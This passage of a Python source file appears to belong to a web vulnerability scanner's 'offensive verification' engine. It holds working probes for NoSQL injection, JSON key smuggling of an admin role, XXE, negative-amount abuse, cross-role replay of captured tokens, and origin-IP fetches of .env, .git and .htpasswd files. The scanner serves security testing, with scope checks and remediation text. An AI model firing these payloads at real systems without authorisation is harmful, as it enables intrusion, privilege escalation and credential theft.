                        baseline = {"catchall_checked": True, "is_catchall": is_cc,
                                   "status": reason.get("status"), "body_len": reason.get("body_len")}
                        if is_cc:
                            # This "signature match" is just the host's SPA/generic
                            # fallback page, indistinguishable from a real hit on
                            # every junk path too — not a genuine exposure.
                            break
                    except Exception:
                        baseline = {"catchall_checked": False}
                findings.append(Finding(
                    check="exposure", module="exposure", severity=sev,
                    title=title, host=ep.host, url=url,
                    evidence=f"GET {url} returned HTTP {r.status_code} with content "
                             f"signatures: {', '.join(matched[:4])}. This confirms the "
                             f"resource is genuinely exposed (not a custom error page).",
                    remediation=rem, confidence="confirmed",
                    verification="content-signature-match",
                    category=cat, attack=_snap(r), baseline=baseline,
                    request_line=f"GET {url}",
                ))
            break  # only the first matching pattern per URL
    return findings


# ===========================================================================
# CHECK: NoSQL Injection — MongoDB operator injection (differential-confirmed)
# ===========================================================================
# Ported attack class from BurpAPISecuritySuite. Gated behind a real target
# (JSON body with a string field, or a query param) and confirmed by a THREE-way
# differential so a permissive endpoint can't false-positive: a false-condition
# operator ({"$gt":"~~~"}) must be REJECTED/empty while a true-condition operator
# ({"$ne":null}) is ACCEPTED and returns MORE than the honest baseline.

_NOSQL_AUTHY = re.compile(r"/(?:login|signin|auth|session|token|user|account|"
                          r"query|search|find|list|report)s?\b", re.I)


def check_nosqli(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    tested = 0
    for ep in inv.post_targets(cap=120):
        if tested >= 40:
            break
        if not _NOSQL_AUTHY.search(ep.path):
            continue
        url = ep.url.split("#")[0]
        method = (list((set(ep.methods) | {ep.method}) & {"POST", "PUT", "PATCH"}) or ["POST"])[0]
        # Pick a plausible string field name from any input function, else a default.
        field = None
        for fn in ep.input_functions:
            for p in (fn.get("params") or fn.get("fields") or []):
                nm = p if isinstance(p, str) else (p.get("name") if isinstance(p, dict) else "")
                if nm and re.search(r"(user|email|name|login|id|q|search|filter)", nm, re.I):
                    field = nm
                    break
            if field:
                break
        field = field or "username"
        ct = {"Content-Type": "application/json"}
        honest = http.request(method, url, json_body={field: "arise-nosql-probe"}, headers=ct)
        if honest is None:
            continue
        false_op = http.request(method, url, json_body={field: {"$gt": "\uffff\uffff"}}, headers=ct)
        true_op = http.request(method, url, json_body={field: {"$ne": None}}, headers=ct)
        if false_op is None or true_op is None:
            continue
        tested += 1
        true_ok = 200 <= true_op.status_code < 300
        false_bad = not (200 <= false_op.status_code < 300) or _similar(false_op, honest)
        # Operator was interpreted: true-condition succeeds and diverges from the
        # honest scalar probe, while the impossible false-condition does not.
        if true_ok and false_bad and not _similar(true_op, false_op) and not _similar(true_op, honest):
            findings.append(Finding(
                check="nosqli", module="nosql_injection", severity="high",
                title="NoSQL operator injection — query operators interpreted from input",
                host=ep.host, url=url, parameter=field,
                evidence=(f"Field '{field}' accepts MongoDB query operators: {{\"$ne\":null}} "
                          f"returned {true_op.status_code} ({_snap(true_op)['len']}B) while the "
                          f"impossible {{\"$gt\":\"\\uffff\"}} returned {false_op.status_code} "
                          f"({_snap(false_op)['len']}B) and the honest scalar returned "
                          f"{honest.status_code} ({_snap(honest)['len']}B). The operator changed "
                          f"the query — a scalar string cannot. Auth-bypass / data-exfil vector."),
                remediation="Reject non-scalar JSON values for query fields; cast to string "
                            "before building the query; use parameterized queries.",
                confidence="confirmed", verification="three-way-differential",
                category="NoSQL Injection",
                request_line=f"{method} {url}  {field}={{$ne:null}}",
                payload=json.dumps({field: {"$ne": None}}),
                baseline=_snap(honest),
                attack={"true_op": _snap(true_op), "false_op": _snap(false_op)},
            ))
    return findings


# ===========================================================================
# CHECK: JSON Smuggling — duplicate / unicode-escaped key precedence
# ===========================================================================
# Two parsers (proxy/WAF vs app) may disagree on which value wins for a
# duplicated or unicode-escaped key. Confirmed by differential: the smuggled
# privilege value must produce a DIFFERENT outcome than the honest value.

def check_json_smuggling(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    tested = 0
    priv_field, low_val, high_val = "role", "user", "admin"
    for ep in inv.post_targets(cap=120):
        if tested >= 30:
            break
        # Only endpoints that plausibly carry a privilege/role/flag field.
        fields = []
        for fn in ep.input_functions:
            for p in (fn.get("params") or fn.get("fields") or []):
                nm = p if isinstance(p, str) else (p.get("name") if isinstance(p, dict) else "")
                if nm:
                    fields.append(nm)
        target_field = next((f for f in fields
                             if re.search(r"(role|admin|is_admin|priv|scope|type|level|access)", f, re.I)),
                            None)
        if not target_field and not re.search(r"/(?:user|account|role|admin|register|signup|profile)", ep.path, re.I):
            continue
        target_field = target_field or priv_field
        url = ep.url.split("#")[0]
        method = (list((set(ep.methods) | {ep.method}) & {"POST", "PUT", "PATCH"}) or ["POST"])[0]
        ct = {"Content-Type": "application/json"}
        honest_low = http.request(method, url, data=json.dumps({target_field: low_val}), headers=ct)
        if honest_low is None or honest_low.status_code >= 500:
            continue
        # Duplicate-key raw body: last-wins vs first-wins parser disagreement.
        dup_body = '{"%s":"%s","%s":"%s"}' % (target_field, low_val, target_field, high_val)
        dup = http.request(method, url, data=dup_body, headers=ct)
        # Unicode-escaped key: {"\u0072ole":"admin"} — decodes to the same key.
        esc_key = "".join("\\u%04x" % ord(c) for c in target_field)
        esc_body = '{"%s":"%s"}' % (esc_key, high_val)
        esc = http.request(method, url, data=esc_body, headers=ct)
        tested += 1
        for label, resp, body in (("duplicate-key", dup, dup_body), ("unicode-escaped-key", esc, esc_body)):
            if resp is None:
                continue
            # Smuggling confirmed when the smuggled privilege body is ACCEPTED
            # (2xx) and diverges from the honest low-privilege baseline.
            if 200 <= resp.status_code < 300 and not _similar(resp, honest_low):
                findings.append(Finding(
                    check="json_smuggling", module="json_smuggling", severity="high",
                    title=f"JSON parser confusion — {label} changes outcome",
                    host=ep.host, url=url, parameter=target_field,
                    evidence=(f"A {label} body for '{target_field}' ({high_val}) returned "
                              f"{resp.status_code} ({_snap(resp)['len']}B), diverging from the honest "
                              f"'{low_val}' baseline ({honest_low.status_code}, {_snap(honest_low)['len']}B). "
                              f"Two JSON parsers disagree on the winning value — a privilege field set "
                              f"this way can smuggle '{high_val}' past a validating front-end."),
                    remediation="Reject duplicate object keys and non-canonical (unicode-escaped) "
                                "keys; parse once and validate the canonical object.",
                    confidence="confirmed", verification="parser-differential",
                    category="Mass Assignment / Parser Confusion",
                    request_line=f"{method} {url}", payload=body,
                    baseline=_snap(honest_low), attack=_snap(resp),
                ))
                break
    return findings


# ===========================================================================
# CHECK: XXE — XML external-entity processing (in-band, non-exfil)
# ===========================================================================
# Production-safe: uses an INTERNAL entity expansion marker, never a file:// or
# OOB fetch. If the server expands a declared entity into the response, the XML
# parser processes DTDs — the pre-condition for XXE — proven without reading
# any file or making an outbound request.

def check_xxe(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    marker = "arise%dxxe" % (int(time.time()) % 100000)
    tested = 0
    cands = []
    for ep in inv.post_targets(cap=150):
        u = ep.url.lower()
        accepts_xml = any((_l(f).find("xml") >= 0) for f in ep.routed_to or []) or \
            u.endswith((".xml",)) or re.search(r"(xml|soap|wsdl|rss|feed|svg|upload)", ep.path, re.I)
        if accepts_xml:
            cands.append(ep)
    for ep in cands[:25]:
        url = ep.url.split("#")[0]
        method = (list((set(ep.methods) | {ep.method}) & {"POST", "PUT"}) or ["POST"])[0]
        payload = ('<?xml version="1.0"?>\n'
                   '<!DOCTYPE arise [<!ENTITY %s "XXE-OK">]>\n'
                   '<arise>&%s;</arise>' % (marker, marker))
        control = ('<?xml version="1.0"?>\n<arise>%s</arise>' % marker)
        r_attack = http.request(method, url, data=payload,
                                headers={"Content-Type": "application/xml"})
        r_ctrl = http.request(method, url, data=control,
                              headers={"Content-Type": "application/xml"})
        tested += 1
        if r_attack is None:
            continue
        ba, bc = body_of(r_attack, 20000), body_of(r_ctrl, 20000) if r_ctrl else ""
        # Entity was expanded: the marker's VALUE ("XXE-OK") appears where only the
        # entity reference was sent, and it did not appear for the control body.
        if "XXE-OK" in ba and "XXE-OK" not in bc:
            findings.append(Finding(
                check="xxe", module="xxe", severity="high",
                title="XXE — XML parser expands external/internal entities",
                host=ep.host, url=url,
                evidence=(f"A declared XML entity was expanded into the response: sending "
                          f"'&{marker};' returned the entity VALUE 'XXE-OK' (the control body without "
                          f"an entity did not). DTD/entity processing is enabled — the pre-condition "
                          f"for file read / SSRF via external entities. (Probe stays in-band; no file "
                          f"or network entity was used.)"),
                remediation="Disable DTDs and external-entity resolution in the XML parser "
                            "(FEATURE_SECURE_PROCESSING / disallow-doctype-decl).",
                confidence="confirmed", verification="entity-expansion-differential",
                category="XXE",
                request_line=f"{method} {url}  (application/xml)", payload=payload,
                baseline=_snap(r_ctrl), attack=_snap(r_attack),
            ))
    return findings


# ===========================================================================
# CHECK: Business Logic — negative / out-of-range value acceptance
# ===========================================================================
# Ported attack class. On value-bearing flows (checkout/order/transfer/topup),
# a negative or absurd quantity/amount that the server ACCEPTS while rejecting
# the honest control is a business-logic flaw (refund inflation, free goods).

_BIZ_FLOW = re.compile(r"/(?:checkout|order|purchase|cart|payment|pay|transfer|"
                       r"topup|recharge|withdraw|refund|redeem|coupon|wallet|"
                       r"balance|quantity|price|discount|book|reserve)s?\b", re.I)
_BIZ_FIELD = re.compile(r"(amount|price|qty|quantity|total|count|value|balance|"
                        r"points|credit|discount|cost|sum|number)", re.I)


def check_business_logic(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    tested = 0
    for ep in inv.post_targets(cap=120):
        if tested >= 30:
            break
        if not _BIZ_FLOW.search(ep.path):
            continue
        fields = []
        for fn in ep.input_functions:
            for p in (fn.get("params") or fn.get("fields") or []):
                nm = p if isinstance(p, str) else (p.get("name") if isinstance(p, dict) else "")
                if nm and _BIZ_FIELD.search(nm):
                    fields.append(nm)
        field = fields[0] if fields else "amount"
        url = ep.url.split("#")[0]
        method = (list((set(ep.methods) | {ep.method}) & {"POST", "PUT", "PATCH"}) or ["POST"])[0]
        ct = {"Content-Type": "application/json"}
        honest = http.request(method, url, json_body={field: 1}, headers=ct)
        if honest is None:
            continue
        honest_ok = 200 <= honest.status_code < 300
        neg = http.request(method, url, json_body={field: -1}, headers=ct)
        tested += 1
        if neg is None:
            continue
        neg_ok = 200 <= neg.status_code < 300
        # Flaw: a negative value is accepted. Strongest when the honest positive
        # value was ALSO accepted (so the endpoint is live) — the server simply
        # fails to reject the negative, which honest input handling never allows.
        if neg_ok and honest_ok:
            findings.append(Finding(
                check="business_logic", module="business_logic", severity="high",
                title="Business-logic flaw — negative value accepted on a value flow",
                host=ep.host, url=url, parameter=field,
                evidence=(f"Field '{field}' = -1 was accepted ({neg.status_code}) on value-bearing "
                          f"flow {ep.path}, the same as the honest +1 ({honest.status_code}). Negative "
                          f"quantities/amounts enable refund inflation, free goods, or balance "
                          f"manipulation. Server must reject non-positive values."),
                remediation="Validate numeric ranges server-side (reject <= 0 and absurd maxima); "
                            "never trust client-supplied amounts/quantities.",
                confidence="probable", verification="value-range-differential",
                category="Business Logic",
                request_line=f"{method} {url}  {field}=-1",
                payload=json.dumps({field: -1}),
                baseline=_snap(honest), attack=_snap(neg),
            ))
    return findings


# ===========================================================================
# CHECK: BFLA — function-level authorization (lower role hits admin function)
# ===========================================================================
# Uses the role identities a human operator captured in Burp (guest/user/admin,
# via burp_bridge_ingest). Distinct from auth_oracle's object-level BOLA: this
# proves a LOWER-privilege role can invoke a function only a HIGHER role should.
# Confirmed by differential: user token gets admin-like content that anon does
# not. This is the one check here that can legitimately mint L4 (authz-violation).

def _load_burp_identities(scan_dir):
    p = os.path.join(scan_dir, "00_har_ingest", "burp_identities.jsonl")
    ids = {}
    if not os.path.isfile(p):
        return ids
    for rec in _iter_jsonl(p):
        role = (rec.get("role") or "").lower().strip()
        if not role:
            continue
        ids[role] = {"authorization": rec.get("authorization") or "",
                     "cookie": rec.get("cookie") or ""}
    return ids


def _ctx_headers(idrec):
    h = {}
    if not idrec:
        return h
    if idrec.get("authorization"):
        h["Authorization"] = idrec["authorization"]
    if idrec.get("cookie"):
        h["Cookie"] = idrec["cookie"]
    return h


def check_bfla(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    ids = _load_burp_identities(opts.get("scan_dir", ""))
    admin = ids.get("admin")
    lower = ids.get("user") or ids.get("guest")
    if not admin or not lower:
        return findings  # needs a captured admin + a lower role to compare
    # Endpoints the admin role actually reached successfully = the privileged
    # function surface. Pulled from the Burp evidence stream.
    caps = os.path.join(opts.get("scan_dir", ""), "00_har_ingest", "evidence_captures.jsonl")
    admin_eps = []
    seen = set()
    for rec in _iter_jsonl(caps):
        if (rec.get("role") or "").lower() != "admin":
            continue
        if not (200 <= int(rec.get("response_status") or 0) < 300):
            continue
        url = rec.get("url")
        if not url or url in seen or not http.in_scope(url):
            continue
        # privilege-ish function surface only
        if not re.search(r"/(admin|internal|manage|console|config|users?|roles?|"
                         r"settings|audit|report|billing|payout)", rec.get("path") or url, re.I):
            continue
        seen.add(url)
        admin_eps.append((rec.get("method") or "GET").upper() + " " + url)
    for spec in admin_eps[:40]:
        method, url = spec.split(" ", 1)
        r_admin = http.request(method, url, headers=_ctx_headers(admin))
        if r_admin is None or not (200 <= r_admin.status_code < 300):
            continue
        r_lower = http.request(method, url, headers=_ctx_headers(lower))
        r_anon = http.request(method, url)
        if r_lower is None:
            continue
        lower_ok = 200 <= r_lower.status_code < 300
        anon_denied = r_anon is None or not (200 <= r_anon.status_code < 300) or not _similar(r_anon, r_admin)
        # BFLA: lower role receives admin-like content that anon does not.
        if lower_ok and _similar(r_lower, r_admin) and anon_denied:
            role_name = "user" if ids.get("user") else "guest"
            findings.append(Finding(
                check="bfla", module="bfla", severity="critical",
                title="Broken function-level authorization (BFLA)",
                host=host_of(url), url=url, parameter=method,
                evidence=(f"The '{role_name}' role invoked an admin-only function and received "
                          f"admin-equivalent content: {role_name}={r_lower.status_code} "
                          f"({_snap(r_lower)['len']}B) matches admin={r_admin.status_code} "
                          f"({_snap(r_admin)['len']}B), while anonymous was denied. Function-level "
                          f"authorization is missing on {method} {url}."),
                remediation="Enforce role/permission checks on every privileged function "
                            "server-side, not only in the UI or on the object.",
                confidence="exploited", verification="cross-role-differential",
                category="BFLA",
                request_line=f"{method} {url}  (as {role_name})",
                baseline={"admin": _snap(r_admin), "anon": _snap(r_anon)},
                attack=_snap(r_lower),
                extra={"ladder_rung": "L4"},
            ))
    return findings


# ===========================================================================
# CHECK: Origin Bypass — probe sensitive paths on discovered origin IPs
# ===========================================================================

_ORIGIN_PROBES = [
    ("/.env", ["DB_PASSWORD", "DB_HOST", "APP_KEY", "SECRET_KEY", "API_KEY",
               "AWS_ACCESS", "REDIS_URL", "DATABASE_URL"], "critical",
     "Exposed .env file (via origin bypass)", "Exposure / Credentials"),
    ("/.git/config", ["[core]", "repositoryformatversion"], "critical",
     "Exposed .git/config (via origin bypass)", "Exposure / VCS"),
    ("/.git/HEAD", ["ref: refs/"], "critical",
     "Exposed .git/HEAD (via origin bypass)", "Exposure / VCS"),
    ("/actuator/env", ["propertySources", "activeProfiles", "systemProperties"], "critical",
     "Exposed Spring Actuator /env (via origin bypass)", "Exposure / Debug"),
    ("/actuator/health", ["status", "UP", "DOWN", "components"], "info",
     "Spring Actuator /health accessible (via origin bypass)", "Exposure / Debug"),
    ("/server-status", ["Apache Server Status", "Total accesses", "Scoreboard"], "medium",
     "Apache server-status (via origin bypass)", "Exposure / Debug"),
    ("/swagger.json", ["swagger", "openapi", "paths"], "medium",
     "Exposed Swagger/OpenAPI schema (via origin bypass)", "Exposure / API Docs"),
    ("/openapi.json", ["swagger", "openapi", "paths"], "medium",
     "Exposed OpenAPI schema (via origin bypass)", "Exposure / API Docs"),
    ("/phpinfo.php", ["PHP Version", "php.ini", "DOCUMENT_ROOT"], "medium",
     "Exposed phpinfo (via origin bypass)", "Exposure / Debug"),
    ("/wp-config.php.bak", ["DB_NAME", "DB_USER", "DB_PASSWORD"], "critical",
     "Exposed wp-config.php backup (via origin bypass)", "Exposure / WordPress"),
    ("/.htpasswd", ["$apr1$", "$2y$", "$2b$", ":{SHA}"], "critical",
     "Exposed .htpasswd (via origin bypass)", "Exposure / Credentials"),
    ("/debug", ["debug", "stack", "trace", "Traceback"], "high",
     "Debug endpoint exposed (via origin bypass)", "Exposure / Debug"),
    ("/graphql", ["__schema", "query", "mutation", "data"], "medium",
     "GraphQL endpoint exposed (via origin bypass)", "Exposure / API"),
    ("/metrics", ["process_", "http_", "jvm_", "go_", "# HELP"], "medium",
     "Prometheus metrics exposed (via origin bypass)", "Exposure / Debug"),
    ("/health", ["status", "healthy", "alive", "ok"], "info",
     "Health endpoint accessible (via origin bypass)", "Exposure / Debug"),
]


def check_origin_bypass(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    scan_dir = opts.get("scan_dir", "")
    bypass_file = os.path.join(scan_dir, "17_cloud_exposure", "origin_bypass.jsonl")
    if not os.path.isfile(bypass_file):
        return findings
    origins = []
    for rec in _iter_jsonl(bypass_file):
        host = rec.get("host", "")
        ip = rec.get("origin_ip", "")
        if host and ip:
            origins.append((host, ip))
    if not origins:
        return findings

    tested = set()
    for hostname, origin_ip in origins[:20]:
        for probe_path, tells, sev, title, cat in _ORIGIN_PROBES:
            key = (origin_ip, probe_path)
            if key in tested:
                continue
            tested.add(key)
            url = f"https://{origin_ip}{probe_path}"
            try:
                r = requests.get(
                    url, headers={"Host": hostname, "User-Agent": UA},
                    timeout=http.timeout, verify=False, allow_redirects=False)
            except Exception:
                try:
                    url = f"http://{origin_ip}{probe_path}"
                    r = requests.get(
                        url, headers={"Host": hostname, "User-Agent": UA},
                        timeout=http.timeout, verify=False, allow_redirects=False)
                except Exception:
                    continue
            if r is None or r.status_code not in (200, 301, 302):
                continue
            if _is_waf_response(r):
                continue
            body = body_of(r, 200_000)
            matched = [t for t in tells if t in body]
            if not matched:
                continue
            findings.append(Finding(
                check="origin_bypass", module="origin_bypass", severity=sev,
                title=title, host=hostname, url=f"https://{hostname}{probe_path}",
                evidence=f"Origin IP {origin_ip} serves {hostname} directly (WAF bypassed). "
                         f"GET {probe_path} via Host-header routing returned HTTP {r.status_code} "
                         f"with content signatures: {', '.join(matched[:3])}. "
                         f"This resource is hidden behind the CDN but exposed on the origin.",
                remediation="Restrict origin server to accept connections only from the CDN; "
                            "block direct IP access; remove sensitive files from production.",
                confidence="confirmed", verification="origin-host-header-probe",
                category=cat,
                request_line=f"GET https://{origin_ip}{probe_path}  Host: {hostname}",
                attack=_snap(r),
                extra={"origin_ip": origin_ip, "hostname": hostname},
            ))
    return findings


# ===========================================================================
# CHECK: CORS Misconfiguration — reflected origin differential
# ===========================================================================

def check_cors(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    evil_origin = "https://evil.arise-test.example"
    tested = set()
    targets = list(inv.hosts[:60])
    for ep in inv.endpoints[:200]:
        u = ep.url.split("?")[0].split("#")[0]
        if u not in tested:
            targets.append(u)
    for url in targets:
        if url in tested:
            continue
        tested.add(url)
        base = http.get(url)
        if base is None or _is_waf_response(base):
            continue
        base_acao = (base.headers.get("Access-Control-Allow-Origin") or "").strip()
        r = http.get(url, headers={"Origin": evil_origin})
        if r is None:
            continue
        acao = (r.headers.get("Access-Control-Allow-Origin") or "").strip()
        acac = (r.headers.get("Access-Control-Allow-Credentials") or "").strip().lower()
        if not acao:
            continue
        if acao == "*" and acac == "true":
            findings.append(Finding(
                check="cors", module="cors", severity="high",
                title="CORS wildcard with credentials",
                host=host_of(url), url=url,
                evidence=f"Access-Control-Allow-Origin: * combined with "
                         f"Access-Control-Allow-Credentials: true — browsers "
                         f"block this, but it signals a broken CORS policy that "
                         f"may be exploitable with null origin or subdomain variants.",
                remediation="Never combine wildcard origin with credentials; "
                            "validate and allowlist specific origins.",
                confidence="confirmed", verification="cors-header-check",
                category="CORS Misconfiguration",
                request_line=f"GET {url}  Origin: {evil_origin}",
                attack=_snap(r), baseline=_snap(base),
            ))
        elif acao == evil_origin:
            sev = "critical" if acac == "true" else "high"
            findings.append(Finding(
                check="cors", module="cors", severity=sev,
                title="CORS origin reflection" + (" with credentials" if acac == "true" else ""),
                host=host_of(url), url=url,
                evidence=f"The server reflected an arbitrary Origin ({evil_origin}) "
                         f"in Access-Control-Allow-Origin"
                         f"{' AND set Allow-Credentials: true' if acac == 'true' else ''}. "
                         f"An attacker's page can read authenticated responses cross-origin"
                         f"{' — full account takeover via CORS' if acac == 'true' else ''}.",
                remediation="Validate the Origin header against a strict allowlist; "
                            "never reflect untrusted origins.",
                confidence="exploited", verification="cors-reflection-differential",
                category="CORS Misconfiguration",
                request_line=f"GET {url}  Origin: {evil_origin}",
                attack=_snap(r), baseline=_snap(base),
            ))
        elif acao == "null":
            findings.append(Finding(
                check="cors", module="cors", severity="medium",
                title="CORS allows null origin",
                host=host_of(url), url=url,
                evidence=f"Access-Control-Allow-Origin: null — exploitable from "
                         f"sandboxed iframes and data: URIs.",
                remediation="Never allow null as a CORS origin.",
                confidence="confirmed", verification="cors-null-origin",
                category="CORS Misconfiguration",
                request_line=f"GET {url}  Origin: null",
                attack=_snap(r), baseline=_snap(base),
            ))
    return findings


# ===========================================================================
# CHECK: Header Disclosure — server/version/debug info in response headers
# ===========================================================================

_DISCLOSURE_HEADERS = {
    "Server": re.compile(r"(?:Apache|nginx|IIS|Tomcat|Jetty|Gunicorn|Werkzeug|Express|"
                         r"Kestrel|LiteSpeed|OpenResty|Caddy|Cowboy|Puma|Unicorn|WEBrick"
                         r")[/ ]\d", re.I),
    "X-Powered-By": re.compile(r".+"),
    "X-AspNet-Version": re.compile(r".+"),
    "X-AspNetMvc-Version": re.compile(r".+"),
    "X-Runtime": re.compile(r"\d"),
    "X-Generator": re.compile(r".+"),
    "X-Drupal-Cache": re.compile(r".+"),
    "X-Debug-Token": re.compile(r".+"),
    "X-Debug-Token-Link": re.compile(r".+"),
}


def check_headers(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    tested = set()
    for h in inv.hosts[:80]:
        if h in tested:
            continue
        tested.add(h)
        r = http.get(h + "/")
        if r is None or _is_waf_response(r):
            continue
        disclosed = []
        for hdr, pat in _DISCLOSURE_HEADERS.items():
            val = r.headers.get(hdr, "")
            if val and pat.search(val):
                disclosed.append(f"{hdr}: {val}")
        if not disclosed:
            continue
        sev = "medium" if any("Debug" in d or "Powered" in d for d in disclosed) else "low"
        findings.append(Finding(
            check="headers", module="headers", severity=sev,
            title=f"Server/version disclosure ({len(disclosed)} header{'s' if len(disclosed)>1 else ''})",
            host=host_of(h), url=h + "/",
            evidence=f"Response headers reveal server technology: "
                     f"{'; '.join(disclosed[:5])}. "
                     f"This aids attacker fingerprinting and CVE targeting.",
            remediation="Remove or generalize Server, X-Powered-By, and debug headers "
                        "in production.",
            confidence="confirmed", verification="header-inspection",
            category="Information Disclosure",
            request_line=f"GET {h}/",
            attack=_snap(r),
        ))
    return findings


def _l(x):
    try:
        return str(x).lower()
    except Exception:
        return ""


# ===========================================================================
# Orchestration
# ===========================================================================

CHECKS = {
    "jwt": check_jwt,
    "graphql": check_graphql,
    "ssti": check_ssti,
    "crlf": check_crlf,
    "redirect": check_redirect,
    "ssrf": check_ssrf,
    "proto": check_proto,
    "cache": check_cache,
    "race": check_race,
    "ws": check_ws,
    "exposure": check_exposure,
    "origin_bypass": check_origin_bypass,
    "cors": check_cors,
    "headers": check_headers,
    # Phase 3 — attack classes ported from BurpAPISecuritySuite. Each is gated
    # behind a real target and differential-confirmed (never fires on a status
    # code alone). bfla additionally consumes the Burp role identities.
    "nosqli": check_nosqli,
    "json_smuggling": check_json_smuggling,
    "xxe": check_xxe,
    "business_logic": check_business_logic,
    "bfla": check_bfla,
}


def run(scan_dir, opts):
    target = opts.get("target") or _infer_target(scan_dir)
    # check_bfla reads the Burp evidence stream + role identities from scan_dir.
    opts.setdefault("scan_dir", scan_dir)
    scope = None
    if ScopeGuard and target:
        try:
            scope = ScopeGuard(target, _load_allowlist(scan_dir))
        except Exception:
            scope = None
    http = Http(rate=opts.get("rate", 25), timeout=opts.get("timeout", 12), scope=scope)
    inv = Inventory(scan_dir, scope=scope)

    only = opts.get("only")
    skip = set(opts.get("skip") or [])
    selected = [c for c in CHECKS if (not only or c in only) and c not in skip]

    all_findings = []
    per_check = {}
    for name in selected:
        t0 = time.time()
        try:
            fnd = CHECKS[name](http, inv, opts) or []
        except Exception as e:
            print(f"[offensive_verify] check {name} error: {e}", file=sys.stderr)
            fnd = []
        per_check[name] = len(fnd)
        all_findings.extend(fnd)
        print(f"[offensive_verify] {name:9s}: {len(fnd):3d} finding(s)  "
              f"({time.time() - t0:.1f}s)", file=sys.stderr)

    # opts["write"]=False lets callers (e.g. the autonomous native-confirm stage
    # running only a SUBSET of checks) get findings WITHOUT overwriting the
    # pipeline's full offensive_findings.jsonl. Default preserves prior behavior.
    if opts.get("write", True):
        _write(scan_dir, opts, all_findings, per_check, inv, target)
    return all_findings, per_check


def _infer_target(scan_dir):
    m = os.path.join(scan_dir, "manifest.json")
    if os.path.isfile(m):
        try:
            return json.load(open(m)).get("target")
        except Exception:
            pass
    base = os.path.basename(os.path.normpath(scan_dir))
    return re.sub(r"-\d{8}.*$", "", base) or None


def _load_allowlist(scan_dir):
    out = []
    for rel in ("known_public.txt", "02_subdomain_enum/all_subdomains.txt"):
        p = os.path.join(scan_dir, rel)
        if os.path.isfile(p):
            out += _read_lines(p)
    return out[:5000]


def _write(scan_dir, opts, findings, per_check, inv, target):
    findings.sort(key=lambda f: _SEV_RANK.get(f.severity, 0), reverse=True)
    records = [f.record() for f in findings]

    # ONE module → ONE output directory (24_advanced_attacks). Both consumers
    # read from here: internet_intel folds *_findings.jsonl, and the dashboard
    # vuln list reads offensive_findings.jsonl directly.
    adv_dir = os.path.join(scan_dir, "24_advanced_attacks")
    os.makedirs(adv_dir, exist_ok=True)

    with open(os.path.join(adv_dir, "offensive_findings.jsonl"), "w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")

    summary = {
        "module": "offensive_verify",
        "target": target,
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "candidates": {
            "endpoints": len(inv.endpoints),
            "hosts": len(inv.hosts),
            "param_targets": len(inv.param_targets()),
            "post_targets": len(inv.post_targets()),
            "graphql_candidates": len(inv.graphql_candidates()),
            "ws_urls": len(inv.ws_urls),
        },
        "findings_by_check": per_check,
        "findings_by_severity": _sev_counts(records),
        "total_findings": len(records),
        "safe_mode": False,
    }
    with open(os.path.join(adv_dir, "offensive_summary.json"), "w") as f:
        json.dump(summary, f, indent=2)
    return summary


def _sev_counts(records):
    out = {}
    for r in records:
        s = r.get("severity", "info")
        out[s] = out.get(s, 0) + 1
    return out


def main():
    ap = argparse.ArgumentParser(description="ARISE unified offensive verification engine")
    ap.add_argument("scan_dir", help="scan output directory")
    ap.add_argument("--target", help="scope apex (defaults to manifest.json / dir name)")
    ap.add_argument("--rate", type=int, default=25, help="requests/sec ceiling")
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--max-targets", type=int, default=300)
    ap.add_argument("--race-concurrency", type=int, default=25)
    ap.add_argument("--oob-domain", help="interactsh/OOB domain for blind SSRF (optional)")
    ap.add_argument("--jwt-wordlist", help="extra HMAC secret wordlist")
    ap.add_argument("--only", help="comma list: " + ",".join(CHECKS))
    ap.add_argument("--skip", help="comma list of checks to skip")
    ap.add_argument("--summary", action="store_true")
    args = ap.parse_args()

    if requests is None:
        print("offensive_verify: 'requests' not installed; cannot run", file=sys.stderr)
        # still write empty outputs so downstream doesn't choke
    opts = {
        "target": args.target,
        "rate": args.rate,
        "timeout": args.timeout,
        "max_targets": args.max_targets,
        "race_concurrency": args.race_concurrency,
        "oob_domain": args.oob_domain,
        "jwt_wordlist": args.jwt_wordlist,
        "only": set(s.strip() for s in args.only.split(",")) if args.only else None,
        "skip": set(s.strip() for s in args.skip.split(",")) if args.skip else None,
    }
    findings, per_check = run(args.scan_dir, opts)

    print(f"offensive_verify: {len(findings)} finding(s) across "
          f"{sum(1 for v in per_check.values() if v)} check(s) -> "
          f"{os.path.join(args.scan_dir, '24_advanced_attacks/offensive_findings.jsonl')}")
    if args.summary:
        by_sev = _sev_counts([f.record() for f in findings])
        print("  by severity: " + (", ".join(f"{k}={v}" for k, v in
              sorted(by_sev.items(), key=lambda kv: _SEV_RANK.get(kv[0], 0),
                     reverse=True)) or "none"))
        for f in findings[:12]:
            print(f"  [{f.severity}] {f.title} — {f.host} ({f.confidence})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
